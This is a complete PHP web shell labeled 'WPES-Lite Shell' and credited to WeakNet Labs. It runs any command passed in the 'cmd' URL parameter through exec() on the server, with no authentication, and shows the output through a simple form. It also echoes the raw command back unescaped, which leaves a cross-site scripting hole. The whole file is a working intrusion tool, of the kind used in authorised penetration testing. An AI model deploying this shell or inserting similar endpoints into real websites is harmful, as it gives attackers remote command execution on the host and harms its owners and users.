<!DOCTYPE html>
<html>
<head>
<title>WPES-Lite Shell</title>
<style>
.cmdInput{
 margin:10px 0 0 0;
}
</style>
</head>
<!-- 2018 WeakNet Labs, Douglas Berdeaux -->
<body>
<?php
 if(isset($_GET['cmd'])){
  echo "<h3>Host: ".gethostname()." - Command: ".$_GET['cmd']."</h3>";
  exec($_GET['cmd'],$result);
  foreach($result as $line){
   $lineParse=str_replace("<","&lt;",$line); # remove <
   $lineParse=str_replace(">","&gt;",$lineParse); # remove >
   echo $lineParse."<br />";
  }
 }else{
  echo "Enter command to execute on server below.";
 }
?>
<div class="cmdInput">
<form action="" method=get">
 CMD: <input type="text" name="cmd" /><br />
 <input type="submit" value="GET Results" />
</form>
</div>
</body>
</html>

